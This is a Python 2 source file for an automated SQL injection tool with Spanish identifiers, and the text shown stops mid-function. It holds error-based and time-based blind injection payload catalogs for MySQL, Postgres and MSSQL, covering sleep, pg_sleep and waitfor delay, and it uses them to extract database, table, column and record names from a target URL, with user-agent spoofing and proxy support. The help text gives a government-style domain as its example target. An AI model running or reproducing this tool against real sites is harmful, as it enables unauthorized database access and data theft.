#!/usr/bin/env python
#coding:utf-8
import requests
from sys import argv, exit, stdout
from urllib import unquote, quote
from HTMLParser import HTMLParser
from getopt import getopt, GetoptError
from time import sleep
from random import random
from random import randint
from random import choice
from os import getenv
from os import mkdir
from datetime import datetime
from os.path import isdir
from os.path import isfile
import socks
import os
###############################################################
## "errorbased" is a file which contains Error Based queries ##
###############################################################
import errorbased
import timebased

class Injection:
	Comodin="_sqli_"
	Ayuda = """
Options:

	-h, --help							- Show help message
	-v 								- Verbose mode (Show Request, payload & Response Headers)

Request:

	--request="http[s]://www.example.gob.mx?id=5"			- Url target to scan
	--method=[get|post]						- Method Get or Post to launch scan (Get by default)
	--user-agent="Googlebot/2.1"					- User Agent string to use
	--random-agent							- Random User Agent to use (by default)
	--data="param1=value1{sust}&param2=value2"			- Data used for post method (Use '{sust}' where you want insert payload [Mandatory use it!!!])
	--cookies="PHPSESSID=ue2;date=20151003"				- Cookie data to use a session
	--proxy="127.0.0.1:8080"					- Proxy ip and port to use at every query [http proxy by default]

Injection:

	--server=(MySQL,Postgres,Mssql)					- Database querys to use (by default use all queries)
	--based=[error|time]						- Force usage of given HTTP method (error based by default)
	--success="Success Phrase"					- String to compare when a response is correct
	--error="Error Phrase"						- String to compare when a response is incorrect
	--time=[1.5]							- Time to use in Time Based Attempt

Enumeration:

	--db 								- Retrieve Database names
	--dbname=db1,db2,db3						- Retrieve Table names of Databases specified
	--tables=table1,table2,table3					- Retrieve Column names of tables specified
	--columns=column1,column2					- Retrieve records of columns specified
	""".format(sust=Comodin)

	Agentes={
		'Chrome':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
		'Google':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
		'iExplorer':'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
		'Firefox':'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
		'Safari':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
		'iPhone':'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16',
		'Android':'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
	}

	cabeceras={}
	proxy={} #if request need a proxy for connection it will be inside this variable
	cookies = {} #if request need coookies it will be inside this variable
	datos={} # Data parameteros for Post request
	method = -1 # True = Get method # False = Post method
	server = "" #URL string
	NoAleatorio = int(random()*100)
	BDatosName=[] # List with Databases name
	ColumName=[]  # List with Columns name
	TableName=[]
	##########################################################################
	##  Variables used to store all successfull queries and data extracted  ##
	##########################################################################
	reportDir = getenv("HOME")+"/sql/"# Directory path to create all data 	##
	succesfullQuery = "succes.lol"											##
	dataXtracted = "data.data"												##
	bdXtracted = "dbnames.data"												##
	tbXtracted = "tbnames.data"												##
	cnXtracted = "cnames.data"												##
	rcXtracted = "records.data"												##
	hname= ""																## Hostname
	aData = ""																## Application name
	fullPath = ""															##
	Dbname = {'MySQL':[],'Postgres':[],'Oracle':[],'Mssql':[]}				##
	YaExiste = False														##
	##########################################################################
	#####################################################################
	##	Variables used for reuse prefix and suffix of previous Attack  ##
	#####################################################################
	newPrefix = ""
	newSuffix = ""
	prefixSuccess = ""
	suffixSuccess = ""
	Which = ""
	bases = []
	Filename = ""
	pref = ""
	suf = ""
	manejador = ""
	sufijos = ['#','/*','//','-- a',';','-- -+']
	Flags={ ## This variable store succesfull injection queries
		'Generic':{'Prefijo':[],'Payload':[],'Sufijo':[]},
		'MySQL':{'Prefijo':[],'Payload':[],'Sufijo':[]},
		'Postgres':{'Prefijo':[],'Payload':[],'Sufijo':[]},
		'Mssql':{'Prefijo':[],'Payload':[],'Sufijo':[]},
		'Oracle':{'Prefijo':[],'Payload':[],'Sufijo':[]}
		}

	Prefijos = [" ","''","'", #Simple Quotes
				" ", ";",
				"')","'))","')))", #Simple Qulotes with Parentheses
				'"','""',
				"';","'';",
				'")','"))','")))',
				'";','"";',
				'");','"));','")));',
				"%'",'%"' #Comodines
				]

	Sufijos={
		#'MySQL':[' ','#','-- -a'," and '%'='"],
		'Generic':['--','-- -'+chr(randint(65,122))],
		'MySQL':['#','-- -'+chr(randint(65,122))],
		'Postgres':["-- -"+chr(randint(65,122)),';-- -'+chr(randint(65,122))],
		'Mssql':['-- -'+chr(randint(65,122))],
		'Oracle':['from dual;']
	}
	SufijosGet={
		#'MySQL':[' ','#','-- -a'," and '%'='"],
		'Generic':['--','-- -+',""],
		'mysql':['#','-- -+',""],
		'pgsql':['-- -a',""],
		'mssql':['-- -+',""],
		'oracle':['from dual;',""]
	}
	catalogoMySQL=["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	catalogo={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoMySQL={
		'version':["' and   ascii(substring(@@version,1,1))" , "'" , "and   ascii(substring(@@version," , "))" , "-- -+"],
		'bases':["lol" , "'" , "AND ascii(substring((SELECT schema_name FROM information_schema.schemata limit 1 offset " , "))" , "-- -+"],
		'current':["' and   ascii(substring(database(),1,1))" , "'" , "and   ascii(substring(database()," , "))" , "-- -+"],
		'tablas':["'" , " and   ascii(substring((SELECT table_name FROM information_schema.tables "  ,  "limit 1 offset "  ,"))" , "-- -+"],
		'columnas':["'" , " and   ascii(substring((SELECT column_name FROM information_schema.columns "  ,  "limit 1 offset "  ,"))" , "-- -+"],
		'datos':["'" , " and   ascii(substring((SELECT " , " FROM "  ,  "limit 1 offset "  ,"))" , "-- -+",")"]

	}		

	catalogoPostgres={
		'version':["' and   ascii(substring((select version()),1,1))" , "'" , "and   ascii(substring((select version())," , "))" , "-- -+"],
		'bases':["lol" , "'" , "AND ascii(substring((SELECT datname FROM pg_database limit 1 offset " , "))" , "-- -+"],
		'current':["' and   ascii(substring((SELECT current_database()),1,1))" , "'" , "and   ascii(substring((SELECT current_database())," , "))" , "-- -+"],
		'tablas':["'" , " and   ascii(substring((SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r''') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid) "  ,  "limit 1 offset "  ,"))" , "-- -+"],
		'columnas':["'" , " and   ascii(substring((SELECT A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') and relname = '"  ,  "limit 1 offset "  ,"))" , "-- -+"],
		'datos':["'" , " and   ascii(substring((cast((SELECT " , " FROM "  ,  "limit 1 offset "  ,"))" , "-- -+",") as varchar))"]
	}
	catalogoMSSQL={
		'version':["' and   ascii(substring(@@version,1,1))" , "'" , "and   ascii(substring(@@version," , "))" , "-- -+"],
		'bases':["lol" , "'" , "AND ascii(substring((SELECT name FROM (SELECT ROW_NUMBER() OVER (ORDER BY name ASC) AS RowNo,name FROM master..sysdatabases offset) x WHERE x.RowNo = " , "))" , "-- -+"],
		'current':["' and   ascii(substring(database(),1,1))" , "'" , "and   ascii(substring((SELECT DB_NAME())," , "))" , "-- -+"],
		'tablas':["'" , " and   ascii(substring((SELECT name FROM (SELECT ROW_NUMBER() OVER (ORDER BY name ASC) AS RowNo,name FROM "  ,  "..sysobjects offset WHERE xtype = 'U') x WHERE x.RowNo = "  ,"))" , "-- -+"],
		'columnas':["'" , " and   ascii(substring((SELECT COLUMN_NAME FROM (SELECT ROW_NUMBER() OVER (ORDER BY COLUMN_NAME ASC) AS RowNo,COLUMN_NAME FROM  "  ,  ") x WHERE x.RowNo = "  ,"))" , "-- -+"],
		'datos':["'" , " and   ascii(substring((SELECT CAST((SELECT " , " # FROM (SELECT ROW_NUMBER() OVER (ORDER BY $ ASC) AS RowNo,# FROM "  ,  " offset) x WHERE x.RowNo = "  ,"))" , "-- -+",") AS varchar))"]
	}
	catalogoOracle={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoMySQLBlind={
#		'version':["'and IF(ascii(substring((SELECT username from user where id = 1),1,1))>1,sleep(10),0)=0-- -+" , "'" , "and   IF(ascii(substring(@@version," , "))" , ",sleep(1),0)=0","-- -+"],
		'version':["LMAO" , "'" , "and   IF(ascii(substring(@@version," , "))" , ",sleep(0.5),0)=0","-- -+","",",sleep(#),0)=0"],
		'bases':["lol" , "'" , "AND IF(ascii(substring((SELECT schema_name FROM information_schema.schemata limit 1 offset " , "))" , ",sleep(0.5),0)=0","-- -+","",",sleep(#),0)=0"],
		'current':["' and   IF(ascii(substring(database(),1,1))" , "'" , "and   ascii(substring(database()," , "))" , ",sleep(0.5),0)=0-- -+","",",sleep(0.5),0)=0",",sleep(#),0)=0"],
		'tablas':["'" , " and   IF(ascii(substring((SELECT table_name FROM information_schema.tables "  ,  "limit 1 offset "  ,"))" , ",sleep(0.5),0)=0","-- -+",",sleep(0.5),0)=0",",sleep(#),0)=0"],
		'columnas':["'" , " and   IF(ascii(substring((SELECT column_name FROM information_schema.columns "  ,  "limit 1 offset "  ,"))" , ",sleep(0.5),0)=0","-- -+",",sleep(0.5),0)=0",",sleep(#),0)=0"],
		'datos':["'" , " and   IF(ascii(substring((SELECT " , " FROM "  ,  "limit 1 offset "  ,"))" , ",sleep(0.5),0)=0",")",",sleep(#),0)=0"],
		'manejador':["mysql"]

	}		

	catalogoPostgresBlind={
		'version':["lol 1" , "';" , "select case when(ascii(substring((select version())," , "))" , "-- -+", "", "", ") then pg_sleep(#) END"],
		'bases':["lol" , "';" , "select case when(ascii(substring((SELECT datname FROM pg_database limit 1 offset " , "))" , "-- -+","","",") then pg_sleep(#) END"],
		'current':["" , "';" , "select case when(ascii(substring((SELECT current_database())," , "))" , "-- -+","","",") then pg_sleep(#) END"],
		'tablas':["';" , " select case when(ascii(substring((SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r''') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid) "  ,  "limit 1 offset "  ,"))" , "-- -+","","",") then pg_sleep(#) END"],
		'columnas':["';" , " select case when(ascii(substring((SELECT A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') and relname = '"  ,  "limit 1 offset "  ,"))" , "-- -+","","",") then pg_sleep(#) END"],
		'datos':["';" , " select case when(ascii(substring((cast((SELECT " , " FROM "  ,  "limit 1 offset "  ,"))" , "-- -+",") as varchar))",") then pg_sleep(#) END"],
		'manejador':["pgsql"]

	}
	catalogoMSSQLBlind={
		'version':["" , "';" , " if (ascii(substring(@@version," , "))" , "-- -+", "", "", ") waitfor delay '00:00:#'"],
		'bases':["lol" , "';" , "if (ascii(substring((SELECT name FROM (SELECT ROW_NUMBER() OVER (ORDER BY name ASC) AS RowNo,name FROM master..sysdatabases offset) x WHERE x.RowNo = " , "))" , "-- -+", "", "", ") waitfor delay '00:00:#'"],
		'current':["' and   ascii(substring(database(),1,1))" , "';" , "if (ascii(substring((SELECT DB_NAME())," , "))" , "-- -+", "", "", ") waitfor delay '00:00:#'"],
		'tablas':["';" , " if (ascii(substring((SELECT name FROM (SELECT ROW_NUMBER() OVER (ORDER BY name ASC) AS RowNo,name FROM "  ,  "..sysobjects offset WHERE xtype = 'U') x WHERE x.RowNo = "  ,"))" , "-- -+", "", "", ") waitfor delay '00:00:#'"],
		'columnas':["'" , " if (ascii(substring((SELECT COLUMN_NAME FROM (SELECT ROW_NUMBER() OVER (ORDER BY COLUMN_NAME ASC) AS RowNo,COLUMN_NAME FROM  "  ,  ") x WHERE x.RowNo = "  ,"))" , "-- -+", "", "", ") waitfor delay '00:00:#'"],
		'datos':["'" , " if (ascii(substring((SELECT CAST((SELECT " , " # FROM (SELECT ROW_NUMBER() OVER (ORDER BY $ ASC) AS RowNo,# FROM "  ,  " offset) x WHERE x.RowNo = "  ,"))" , "-- -+",") AS varchar))", ") waitfor delay '00:00:#'"],
		'manejador':["mssql"]
	}
	catalogoOracleBlind={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	notautos=['and 1=0-- -+']
	PayloadsAttemptGet={ # Theses payloads are used in the SQLi blind detection
					  # And we just used specific functions in which DBMS works
	
	'mysql':[
				  'and ascii(substring({0},1,1))={1}'.format(chr(randint(48,126)),ord(chr(randint(48,126)))),#'and ascii(substring({0},1,1))={1}'.format(chr(int(random()*100)),ord(chr(int(random()*100)))), # Complex substring nested ascii
				  'and cast("{0}" as signed)=cast("{0}" as signed)'.format(NoAleatorio), # Easy integers conditionals
				  '&& ( select if ( cast((select floor(rand()*100)) as signed)>0,2,null) )',#'&& {0}={0}'.format(int(random()*1000)), # Easy conditionals
				  #Specific queries
				  #'&& (select @@version)',
				  'and (select database())'
				  'and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'
				  ],
	'pgsql':[
				  #'and cast({0} as int)=cast({0} as int)'.format(int(random()*1000)),'and cast({0} as integer)=cast({0} as integer)'.format(int(random()*1000)),
				  'and (select current_database())',
				  #'and (select user)',
				  'and trunc(random() * cast(random()*1291 as int) - 1)>0',
				  'and ascii(substring(@@version,1,1))=ascii("P")'
				  'and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'
				],
	'mssql':[
				"and (PI()* SQUARE(rand())) < {0}".format(randint(10,99)),
				"and (cast('{0}' as integer)) = (cast('{0}' as integer)) and (PI()) like '%3%'".format(randint(1,154)),
				"and CONVERT(varchar, SERVERPROPERTY('productversion')) like '%.%'",
				"and (atn2(rand(),rand()*rand())) < rand()*{0}".format(randint(10,99)),
				"and (LEN(host_name())>0)"
			],
	'oracle':['and select @@version from dual']
			}

	PayloadsAttemptGetTime={ # Theses payloads are used in the SQLi blind detection
					  # And we just used specific functions in which DBMS works
	'mysql':[
				'and IF(1=1,sleep(2),0)=0',
				'and ascii(substring({0},1,1))={1}'.format(chr(randint(48,126)),ord(chr(randint(48,126)))),#'and ascii(substring({0},1,1))={1}'.format(chr(int(random()*100)),ord(chr(int(random()*100)))), # Complex substring nested ascii
				'and cast("{0}" as signed)=cast("{0}" as signed)'.format(NoAleatorio), # Easy integers conditionals
				'&& ( select if ( cast((select floor(rand()*100)) as signed)>0,2,null) )',#'&& {0}={0}'.format(int(random()*1000)), # Easy conditionals
				#Specific queries
				#'&& (select @@version)',
				],
	'pgsql':[
				  "select case when (select 11=11) then pg_sleep(2) else 'e' end",
				  'select case when(1=1) then pg_sleep(2) end'

			  	  
				],
	'mssql':[
				" if 1=1 waitfor delay '00:00:02'",
				"and (cast('{0}' as integer)) = (cast('{0}' as integer)) and (PI()) like '%3%'".format(randint(1,154)),
				"and CONVERT(varchar, SERVERPROPERTY('productversion')) like '%.%'",
				"and (atn2(rand(),rand()*rand())) < rand()*{0}".format(randint(10,99)),
				"and (LEN(host_name())>0)"
			],
	'oracle':['and select @@version from dual']
			}



	GoodRequest=0

					#######################################
					####   Queries loaded from files   ####
					#######################################
	PayloadsAttempt = 0
	PayloadsDBnames = 0 
	RegisterLength = 0
	TableLength = 0 
	TablesName = 0 
	ColumnLength = 0 
	ColumnNames= 0 
	numRegisters = 0
	RecordQuerys = 0
	TamrecordQuery = 0 

	notautos=['and 1=0-- -+']
	SentHeaders = ""
	respuesta = ""
	dataTempo = {}
	####
	dnames = False
	tnames = False
	cnames = False
	rnames = False
	####
	todasColumnas = False
	listaColumnas=[]
	####
	todasTablas = False
	listaTablas=""
	####
	todasBases = False
	listaBases = ""
	RelacionBaseTabla={}
	rrecords = []
	####
	based = "Both"
	time = 1.5
	dormir = "DOORMIR"
	verbosity = False
	error = ""
	success = ""
	errorT = False


	def __init__(self):
		self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})
		self.cabeceras.update({'Connection':'close'})

	def setVerbosity(self,simon):
		self.verbosity = simon

	def setSuccess(self,successPhrase):
		self.success = str(successPhrase)

	def setError(self,errorPhrase):
		self.errorT = True
		self.error = str(errorPhrase)

	def searchDbname(self,Buscar):
		self.dnames = Buscar

	def searchTbname(self,Buscar):
		 self.tnames = Buscar

	def searchColumns(self,Buscar):
		 self.cnames = Buscar

	def searchRecords(self,Buscar):
		self.rnames = Buscar

	def setAgent(self,agent=""):
		if agent:
			self.cabeceras.update({'User-Agent':agent})
		else:
			self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})
		self.cabeceras.update({'Connection':'close'})

	def setServer(self,server):
		self.server = server

	def setCookie(self,galleta):
		galleta = galleta.split(';')
		for value in galleta:
			self.cookies.update({value.split('=')[0]:value.split('=')[1]})

	def setData(self,datosPagina):
		datosPagina = datosPagina.split('&')
		for parameter in datosPagina:
			self.datos.update({parameter.split('=')[0]:parameter.split('=')[1]})

	def setMethod(self,metodo):
		if metodo == 'get':
			self.method = True
		elif metodo == 'post':
			self.method = False
		else:
			print "Method not implemented"
	def setProxy(self,proxy):
		if proxy.split("://")[0] in ["http","ftp","https"]:
			self.proxy = {proxy.split("://")[0]:proxy.split("://")[1]}
		else:
			self.proxy = {"http":proxy}

	def setColumns(self,columnas):
		if columnas[0]=="all":
			self.todasColumnas = True
		else:
			self.todasColumnas = False
			self.columnasElegidas = columnas

	def setTables(self,tablas):
		if tablas[0] == "all":
			self.todasTablas = True
			#print "TAAAABLAS",tablas
		else:
			todasTablas = False
			self.listaTablas = tablas

	def setDBname(self,dbb):
		if dbb[0] == "all":
			self.todasBases = True
		else:
			self.todasBases = False
		self.listaBases = dbb
		#print ":s",self.listaBases

	def setDBMS(self,which):
		self.Which = which

	def setBased(self,technique):
		self.based = technique

	def setTime(self,ttime):
		self.time = ttime

	@staticmethod
	def defBase(obj):
		
		# if obj.verbosity:
		# 	obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(obj.server)))
		if obj.based == "error":
			vuln = False
			consulta = requests.get(url=obj.server.replace("_sqli_",""),cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
			if obj.verbosity:
				obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(obj.server.replace("_sqli_",""))))
			for pref in obj.Prefijos:
				if "_sqli_" in obj.server:
					consulta2 = requests.get(url=obj.server.replace("_sqli_",pref),cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				else:
					consulta2 = requests.get(url=obj.server+pref,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				if obj.verbosity:
					obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(obj.server.replace("_sqli_",pref))))
				if ((consulta.text != consulta2.text) ^ (len(obj.error)>0 or len(obj.success)>0)) or  (len(obj.error)>0 and obj.error in consulta2.text) or (len(obj.success)> 0 and not obj.success in consulta2.text):
					vuln = True
			if not vuln:
				return
			for manejadores in obj.PayloadsAttemptGet.keys():
				#print "manejador:"+manejadores
				for querys in obj.PayloadsAttemptGet[manejadores]:
					#print "querys:"+querys
					for pref in obj.Prefijos:
						for suf in obj.SufijosGet[manejadores]:
							if not "_sqli_" in obj.server:
								direccion = obj.server+pref+" "+querys+suf
							elif "_sqli_" in obj.server:
								direccion = obj.server.replace("_sqli_",pref+" "+querys+suf)
							consulta2 = requests.get(url=direccion,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
							#consulta2 = requests.get(url=obj.server+" "+pref+querys+suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
							if obj.verbosity:
								obj.showData(objeto=consulta2,vulnerable=True,lll=unquote(repr(direccion)))
							isSuccess = False
							if (len(obj.success)>0):
								isSuccess = obj.success in consulta2.text
							if consulta.text == consulta2.text or not obj.error in consulta2.text or isSuccess:
								obj.pref = pref
								obj.suf = suf
								obj.manejador = manejadores
								ptemp = pref +querys+ suf
								obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(ptemp)))
								#print "!"++"!"
								return
		elif obj.based == "time":
			consulta = requests.get(url=obj.server.replace("_sqli_",""),cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
			if obj.verbosity:
				obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(obj.server)))
			for manejadores in obj.PayloadsAttemptGetTime.keys():
				for querys in obj.PayloadsAttemptGetTime[manejadores]:
					for pref in obj.Prefijos:
						for suf in obj.SufijosGet[manejadores]:
							if not "_sqli_" in obj.server:
								direccion = obj.server+pref+" "+querys+suf
							elif "_sqli_" in obj.server:
								direccion = obj.server.replace("_sqli_",pref+" "+querys+suf)
							consulta2 = requests.get(url=direccion,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
							if obj.verbosity:
								obj.showData(objeto=consulta2,vulnerable=True,lll=unquote(repr(direccion)))
							if (consulta2.elapsed.total_seconds() > 2):
								obj.pref = pref
								obj.suf = suf
								obj.manejador = manejadores
								return
	@staticmethod
	def busqueda(obj,manejador,tipo,ok,up,down,fila,columna,where,based):
		
		#print "ok!:"+ok
		caracter = chr(Injection.getMid(up,down))
		#print "up: ",up," car: ",ord(caracter)," down:",down
		if tipo == "version" and based == "error":
			coord = str(fila)+","+str(columna)
			if not "_sqli_" in obj.server:
				direccion = obj.server+obj.pref+manejador[tipo][2]+coord+manejador[tipo][3]+"_cond_"
			elif "_sqli_" in obj.server:
				direccion = obj.server.replace("_sqli_",obj.pref+manejador[tipo][2]+coord+manejador[tipo][3]+"_cond_")
		elif tipo == "bases"  and based == "error":
			coord = str(columna)+"),"+str(fila)+",1"
			#print manejador[tipo][2]
			#print manejador[tipo][3]
			if not "_sqli_" in obj.server:
				direccion = obj.server+obj.pref+manejador[tipo][2]+coord+manejador[tipo][3]+"_cond_"
			elif "_sqli_" in obj.server:
				direccion = obj.server.replace("_sqli_",obj.pref+manejador[tipo][2]+coord+manejador[tipo][3]+"_cond_")
		elif tipo == "current"  and based == "error":
			coord = str(fila)+","+str(columna)			
			if not "_sqli_" in obj.server:
				direccion = obj.server+obj.pref+manejador[tipo][2]+coord+manejador[tipo][3]+"_cond_"
			elif "_sqli_" in obj.server:
				direccion = obj.server.replace("_sqli_",obj.pref+manejador[tipo][2]+coord+manejador[tipo][3]+"_cond_")
		elif tipo == "tablas"  and based == "error":
			coord = "," + str(fila)+",1"
			if not "_sqli_" in obj.server:
				direccion = obj.server+obj.pref+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]+"_cond_"
				#print direccion+"!"
			elif "_sqli_" in obj.server:
				direccion = obj.server.replace("_sqli_",obj.pref+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]+"_cond_")
				#print direccion+"!"
			#print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"
		elif tipo == "columnas"  and based == "error":
			coord = "," + str(fila)+",1"
			if not "_sqli_" in obj.server:
				direccion = obj.server+obj.pref+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]+"_cond_"
			elif "_sqli_" in obj.server:
				direccion = obj.server.replace("_sqli_",obj.pref+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]+"_cond_")

			#print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"
		elif tipo == "datos"  and based == "error":
			coord = "," + str(fila)+",1"
			if not "_sqli_" in obj.server:
				direccion = obj.server+obj.pref+manejador[tipo][1]+where+manejador[tipo][3]+str(columna)+manejador[tipo][6]+coord+manejador[tipo][4]+"_cond_"
			elif "_sqli_" in obj.server:
				direccion = obj.server.replace("_sqli_",obj.pref+manejador[tipo][1]+where+manejador[tipo][3]+str(columna)+manejador[tipo][6]+coord+manejador[tipo][4]+"_cond_")
			#print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"
		elif tipo == "version" and based == "time":
			coord = str(fila)+","+str(columna)
			if not "_sqli_" in obj.server:
				direccion = obj.server+obj.pref+manejador[tipo][2]+coord+manejador[tipo][3]+"_cond_"
			elif "_sqli_" in obj.server:
				direccion = obj.server.replace("_sqli_",obj.pref+manejador[tipo][2]+coord+manejador[tipo][3]+"_cond_")
			#print direccion
			#+">"+str(ord(caracter))+"-- -+"
		elif tipo == "bases"  and based == "time":
			coord = str(columna)+"),"+str(fila)+",1"
			if not "_sqli_" in obj.server:
				direccion = obj.server+obj.pref+manejador[tipo][2]+coord+manejador[tipo][3]+"_cond_"
			elif "_sqli_" in obj.server:
				direccion = obj.server.replace("_sqli_",obj.pref+manejador[tipo][2]+coord+manejador[tipo][3]+"_cond_")

		elif tipo == "current"  and based == "time":
			coord = str(fila)+","+str(columna)
			if not "_sqli_" in obj.server:
				direccion = obj.server+obj.pref+manejador[tipo][2]+coord+manejador[tipo][3]+"_cond_"
			elif "_sqli_" in obj.server:
				direccion = obj.server.replace("_sqli_",obj.pref+manejador[tipo][2]+coord+manejador[tipo][3]+"_cond_")
				
		elif tipo == "tablas"  and based == "time":
			coord = "," + str(fila)+",1"
			if not "_sqli_" in obj.server:
				direccion = obj.server+obj.pref+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]+"_cond_"
				#print direccion
			elif "_sqli_" in obj.server:
				direccion = obj.server.replace("_sqli_",obj.pref+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]+"_cond_")
				#print direccion
			#print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"

		elif tipo == "columnas"  and based == "time":
			coord = "," + str(fila)+",1"
			if not "_sqli_" in obj.server:
				direccion = obj.server+obj.pref+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]+"_cond_"
			elif "_sqli_" in obj.server:
				direccion = obj.server.replace("_sqli_",obj.pref+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]+"_cond_")
			#print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"
		elif tipo == "datos"  and based == "time":
			coord = "," + str(fila)+",1"
			
			if not "_sqli_" in obj.server:
				direccion = obj.server+obj.pref+manejador[tipo][1]+where+manejador[tipo][3]+str(columna)+manejador[tipo][6]+coord+manejador[tipo][4]+"_cond_"
			elif "_sqli_" in obj.server:
				direccion = obj.server.replace("_sqli_",obj.pref+manejador[tipo][1]+where+manejador[tipo][3]+str(columna)+manejador[tipo][6]+coord+manejador[tipo][4]+"_cond_")
		if based == "error":
			consulta = requests.get(url=direccion.replace("_cond_","="+str(ord(caracter))+obj.suf),cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
			
			if obj.verbosity:
				obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(direccion.replace("_cond_","="+str(ord(caracter))+obj.suf))))
			if tipo == "ve2rsion":
				print direccion.replace("_cond_","="+str(ord(caracter))+obj.suf)
			isSuccess = False
			if (len(obj.success)>0):
				isSuccess = obj.success in consulta.text
			if consulta.text == ok or not obj.error in consulta.text or isSuccess:
				obj.showCharacter(caracter)
				return caracter

			elif (consulta.text != ok or  obj.error in consulta.text or not obj.success in consulta.text) and (up == down ) :
				return "No encontrado"
			else:
				

				consulta2 = requests.get(url=direccion.replace("_cond_",">"+str(ord(caracter))+obj.suf),cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				if obj.verbosity:
					obj.showData(objeto=consulta2,vulnerable=True,lll=unquote(repr(direccion.replace("_cond_",">"+str(ord(caracter))+obj.suf))))
				if tipo == "ve2rsion":
					print direccion.replace("_cond_",">"+str(ord(caracter))+obj.suf)

				isSuccess = False
				if (len(obj.success)>0):
					isSuccess = obj.success in consulta2.text
				if consulta2.text == ok or not obj.error in consulta2.text or isSuccess:
					return Injection.busqueda(obj,manejador,tipo,ok,up,ord(caracter),fila,columna,where,obj.based)
				else:
					down2=down
					if (down2 + 1) == ord(caracter):
						return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter)-1,down,fila,columna,where,obj.based)
					return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter),down,fila,columna,where,obj.based)


		elif based == "time":
			tiempo = str(obj.time)
			espera = tiempo
			#print tiempo
			try:
				if manejador["manejador"][0]=="mssql" and len(str(obj.time)) == 1:
					#print manejador["manejador"][0]
					tiempo = "0"+str(obj.time)
				elif manejador["manejador"][0]=="mysql":
					#print manejador["manejador"][0]
					tiempo = str(float(obj.time)/2)
				elif manejador["manejador"][0]=="pgsql":
					#print manejador["manejador"][0]
					tiempo = str(obj.time)
			except Exception, e:
				print e
				#print "lol"
